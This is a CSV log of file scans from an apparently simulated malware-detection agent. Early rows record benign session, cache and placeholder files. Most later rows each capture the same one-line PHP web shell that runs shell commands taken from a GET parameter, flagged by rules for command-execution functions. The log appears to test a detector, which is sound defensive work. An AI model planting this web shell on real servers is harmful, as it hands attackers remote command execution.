id,agent_id,hostname,file_path,file_hash_sha256,file_content,threat_score,analysis_findings,is_whitelisted,quarantined_path,timestamp
801,benign-sim-agent-001,servidor-saudavel,/tmp/session_xyz123.tmp,,"user_id|s:1:""1"";",0,{'regras_acionadas': None},False,,2025-08-30 12:56:18.125720+00:00
802,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/cache/page/index.html,,,0,,False,,2025-08-30 12:56:20.144849+00:00
803,benign-sim-agent-001,servidor-saudavel,/tmp/session_xyz123.tmp,,"user_id|s:1:""1"";",0,{'regras_acionadas': None},False,,2025-08-30 12:56:22.158604+00:00
804,benign-sim-agent-001,servidor-saudavel,/tmp/session_xyz123.tmp,,"user_id|s:1:""1"";",0,{'regras_acionadas': None},False,,2025-08-30 12:56:24.183747+00:00
805,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/uploads/2025/07/imagem_nova.jpg,,CONTEUDO_FALSO_DE_IMAGEM_JPG,0,{'regras_acionadas': None},False,,2025-08-30 12:56:26.206601+00:00
806,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/uploads/2025/07/imagem_nova.jpg,,CONTEUDO_FALSO_DE_IMAGEM_JPG,0,{'regras_acionadas': None},False,,2025-08-30 12:56:28.233505+00:00
807,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/cache/page/index.html,,,0,,False,,2025-08-30 12:56:30.251920+00:00
808,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/uploads/2025/07/imagem_nova.jpg,,CONTEUDO_FALSO_DE_IMAGEM_JPG,0,{'regras_acionadas': None},False,,2025-08-30 12:56:32.266441+00:00
809,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/cache/page/index.html,,,0,,False,,2025-08-30 12:56:34.287264+00:00
810,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/uploads/2025/07/imagem_nova.jpg,,CONTEUDO_FALSO_DE_IMAGEM_JPG,0,{'regras_acionadas': None},False,,2025-08-30 12:56:36.297721+00:00
811,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/uploads/2025/07/imagem_nova.jpg,,CONTEUDO_FALSO_DE_IMAGEM_JPG,0,{'regras_acionadas': None},False,,2025-08-30 12:56:38.321352+00:00
812,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/uploads/2025/07/imagem_nova.jpg,,CONTEUDO_FALSO_DE_IMAGEM_JPG,0,{'regras_acionadas': None},False,,2025-08-30 12:56:40.340318+00:00
813,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/uploads/2025/07/imagem_nova.jpg,,CONTEUDO_FALSO_DE_IMAGEM_JPG,0,{'regras_acionadas': None},False,,2025-08-30 12:56:42.363828+00:00
814,benign-sim-agent-001,servidor-saudavel,/tmp/session_xyz123.tmp,,"user_id|s:1:""1"";",0,{'regras_acionadas': None},False,,2025-08-30 12:56:44.383640+00:00
815,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/cache/page/index.html,,,0,,False,,2025-08-30 12:56:46.406951+00:00
816,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/uploads/2025/07/imagem_nova.jpg,,CONTEUDO_FALSO_DE_IMAGEM_JPG,0,{'regras_acionadas': None},False,,2025-08-30 12:56:48.426685+00:00
817,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/cache/page/index.html,,,0,,False,,2025-08-30 12:56:50.447213+00:00
818,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/cache/page/index.html,,,0,,False,,2025-08-30 12:56:52.461428+00:00
819,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/uploads/2025/07/imagem_nova.jpg,,CONTEUDO_FALSO_DE_IMAGEM_JPG,0,{'regras_acionadas': None},False,,2025-08-30 12:56:54.471513+00:00
820,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/uploads/2025/07/imagem_nova.jpg,,CONTEUDO_FALSO_DE_IMAGEM_JPG,0,{'regras_acionadas': None},False,,2025-08-30 12:56:56.490914+00:00
821,benign-sim-agent-001,servidor-saudavel,/tmp/session_xyz123.tmp,,"user_id|s:1:""1"";",0,{'regras_acionadas': None},False,,2025-08-30 12:56:58.512758+00:00
822,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/uploads/2025/07/imagem_nova.jpg,,CONTEUDO_FALSO_DE_IMAGEM_JPG,0,{'regras_acionadas': None},False,,2025-08-30 12:57:00.532235+00:00
823,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/cache/page/index.html,,,0,,False,,2025-08-30 12:57:02.555792+00:00
824,benign-sim-agent-001,servidor-saudavel,/tmp/session_xyz123.tmp,,"user_id|s:1:""1"";",0,{'regras_acionadas': None},False,,2025-08-30 12:57:04.565642+00:00
825,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/uploads/2025/07/imagem_nova.jpg,,CONTEUDO_FALSO_DE_IMAGEM_JPG,0,{'regras_acionadas': None},False,,2025-08-30 12:57:06.588285+00:00
826,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/uploads/2025/07/imagem_nova.jpg,,CONTEUDO_FALSO_DE_IMAGEM_JPG,0,{'regras_acionadas': None},False,,2025-08-30 12:57:08.606591+00:00
827,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/cache/page/index.html,,,0,,False,,2025-08-30 12:57:10.625819+00:00
828,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/uploads/2025/07/imagem_nova.jpg,,CONTEUDO_FALSO_DE_IMAGEM_JPG,0,{'regras_acionadas': None},False,,2025-08-30 12:57:12.640245+00:00
829,benign-sim-agent-001,servidor-saudavel,/tmp/session_xyz123.tmp,,"user_id|s:1:""1"";",0,{'regras_acionadas': None},False,,2025-08-30 12:57:14.659355+00:00
830,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/cache/page/index.html,,,0,,False,,2025-08-30 12:57:16.678904+00:00
831,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/cache/page/index.html,,,0,,False,,2025-08-30 12:57:18.692249+00:00
832,sim-agent-001,simulador-host,/tmp/simulacao_68116.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:57:35.377615+00:00
833,sim-agent-001,simulador-host,/tmp/simulacao_27406.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:57:39.412780+00:00
834,sim-agent-001,simulador-host,/tmp/simulacao_44602.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:57:43.434560+00:00
835,sim-agent-001,simulador-host,/tmp/simulacao_60579.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:57:47.455327+00:00
836,sim-agent-001,simulador-host,/tmp/simulacao_93550.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:57:51.475781+00:00
837,sim-agent-001,simulador-host,/tmp/simulacao_24320.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:57:55.504998+00:00
838,sim-agent-001,simulador-host,/tmp/simulacao_26694.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:57:59.528003+00:00
839,sim-agent-001,simulador-host,/tmp/simulacao_28826.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:58:03.548644+00:00
840,sim-agent-001,simulador-host,/tmp/simulacao_28862.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:58:07.580793+00:00
841,sim-agent-001,simulador-host,/tmp/simulacao_30778.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:58:11.600994+00:00
842,sim-agent-001,simulador-host,/tmp/simulacao_5342.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:58:15.621079+00:00
843,sim-agent-001,simulador-host,/tmp/simulacao_49049.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:58:19.655910+00:00
844,sim-agent-001,simulador-host,/tmp/simulacao_64850.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:58:23.677579+00:00
845,sim-agent-001,simulador-host,/tmp/simulacao_17981.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:58:27.703071+00:00
846,sim-agent-001,simulador-host,/tmp/simulacao_80419.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:58:31.722756+00:00
847,sim-agent-001,simulador-host,/tmp/simulacao_7007.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:58:35.746477+00:00
848,sim-agent-001,simulador-host,/tmp/simulacao_63270.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:58:39.776563+00:00
849,sim-agent-001,simulador-host,/tmp/simulacao_42420.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:58:43.802131+00:00
850,sim-agent-001,simulador-host,/tmp/simulacao_98533.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:58:47.866363+00:00
851,sim-agent-001,simulador-host,/tmp/simulacao_18110.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:58:51.888871+00:00
852,sim-agent-001,simulador-host,/tmp/simulacao_67798.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:58:55.909389+00:00
853,sim-agent-001,simulador-host,/tmp/simulacao_67949.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:58:59.928760+00:00
854,sim-agent-001,simulador-host,/tmp/simulacao_97881.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:59:03.950945+00:00
855,sim-agent-001,simulador-host,/tmp/simulacao_49892.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:59:07.970243+00:00
856,sim-agent-001,simulador-host,/tmp/simulacao_47455.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:59:11.994908+00:00
857,sim-agent-001,simulador-host,/tmp/simulacao_84606.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:59:16.017890+00:00
858,sim-agent-001,simulador-host,/tmp/simulacao_34099.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:59:20.404725+00:00
859,sim-agent-001,simulador-host,/tmp/simulacao_30285.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:59:24.470654+00:00
860,sim-agent-001,simulador-host,/tmp/simulacao_38836.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:59:28.563188+00:00
861,sim-agent-001,simulador-host,/tmp/simulacao_56633.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:59:32.591849+00:00
862,sim-agent-001,simulador-host,/tmp/simulacao_16769.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:59:36.613595+00:00
863,sim-agent-001,simulador-host,/tmp/simulacao_66325.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:59:40.637378+00:00
864,sim-agent-001,simulador-host,/tmp/simulacao_26589.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:59:44.658747+00:00
865,sim-agent-001,simulador-host,/tmp/simulacao_36560.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:59:48.679421+00:00
866,sim-agent-001,simulador-host,/tmp/simulacao_93407.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:59:52.699955+00:00
867,sim-agent-001,simulador-host,/tmp/simulacao_60036.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 12:59:56.725901+00:00
868,sim-agent-001,simulador-host,/tmp/simulacao_12847.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:00:00.747047+00:00
869,sim-agent-001,simulador-host,/tmp/simulacao_68434.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:00:04.768715+00:00
870,sim-agent-001,simulador-host,/tmp/simulacao_54335.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:00:08.797483+00:00
871,sim-agent-001,simulador-host,/tmp/simulacao_94909.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:00:12.973164+00:00
872,sim-agent-001,simulador-host,/tmp/simulacao_3203.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:00:16.993987+00:00
873,sim-agent-001,simulador-host,/tmp/simulacao_44256.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:00:21.014767+00:00
874,sim-agent-001,simulador-host,/tmp/simulacao_34939.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:00:25.034833+00:00
875,sim-agent-001,simulador-host,/tmp/simulacao_56085.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:00:29.056036+00:00
876,sim-agent-001,simulador-host,/tmp/simulacao_70960.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:00:33.077633+00:00
877,sim-agent-001,simulador-host,/tmp/simulacao_10459.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:00:37.097434+00:00
878,sim-agent-001,simulador-host,/tmp/simulacao_61218.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:00:41.120270+00:00
879,sim-agent-001,simulador-host,/tmp/simulacao_63974.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:00:45.141085+00:00
880,sim-agent-001,simulador-host,/tmp/simulacao_48197.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:00:49.167426+00:00
881,sim-agent-001,simulador-host,/tmp/simulacao_95007.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:00:53.204481+00:00
882,sim-agent-001,simulador-host,/tmp/simulacao_3597.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:00:57.224544+00:00
883,sim-agent-001,simulador-host,/tmp/simulacao_20063.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:01:01.249555+00:00
884,sim-agent-001,simulador-host,/tmp/simulacao_26460.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:01:05.270424+00:00
885,sim-agent-001,simulador-host,/tmp/simulacao_57723.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:01:09.294508+00:00
886,sim-agent-001,simulador-host,/tmp/simulacao_66111.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:01:13.315413+00:00
887,sim-agent-001,simulador-host,/tmp/simulacao_68269.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:01:17.338276+00:00
888,sim-agent-001,simulador-host,/tmp/simulacao_50034.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:01:21.358863+00:00
889,sim-agent-001,simulador-host,/tmp/simulacao_35511.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:01:25.385009+00:00
890,sim-agent-001,simulador-host,/tmp/simulacao_27120.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:01:29.410459+00:00
891,sim-agent-001,simulador-host,/tmp/simulacao_75462.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:01:33.430886+00:00
892,sim-agent-001,simulador-host,/tmp/simulacao_20388.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:01:37.451198+00:00
893,sim-agent-001,simulador-host,/tmp/simulacao_102.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:01:41.471700+00:00
894,sim-agent-001,simulador-host,/tmp/simulacao_64252.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:01:45.500050+00:00
895,sim-agent-001,simulador-host,/tmp/simulacao_24746.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:01:49.522159+00:00
896,sim-agent-001,simulador-host,/tmp/simulacao_43581.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:01:53.543697+00:00
897,sim-agent-001,simulador-host,/tmp/simulacao_11339.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:01:57.565786+00:00
898,sim-agent-001,simulador-host,/tmp/simulacao_2516.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:02:01.593418+00:00
899,sim-agent-001,simulador-host,/tmp/simulacao_54527.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:02:05.612642+00:00
900,sim-agent-001,simulador-host,/tmp/simulacao_86269.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:02:09.644290+00:00
901,sim-agent-001,simulador-host,/tmp/simulacao_94851.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:02:13.665328+00:00
902,sim-agent-001,simulador-host,/tmp/simulacao_49767.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:02:17.685952+00:00
903,sim-agent-001,simulador-host,/tmp/simulacao_23816.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:02:21.708770+00:00
904,sim-agent-001,simulador-host,/tmp/simulacao_6414.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:02:25.729643+00:00
905,sim-agent-001,simulador-host,/tmp/simulacao_25228.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:02:29.751757+00:00
906,sim-agent-001,simulador-host,/tmp/simulacao_31733.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:02:33.781300+00:00
907,sim-agent-001,simulador-host,/tmp/simulacao_33917.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:02:37.802944+00:00
908,sim-agent-001,simulador-host,/tmp/simulacao_53430.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:02:41.823232+00:00
909,sim-agent-001,simulador-host,/tmp/simulacao_39201.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:02:45.848590+00:00
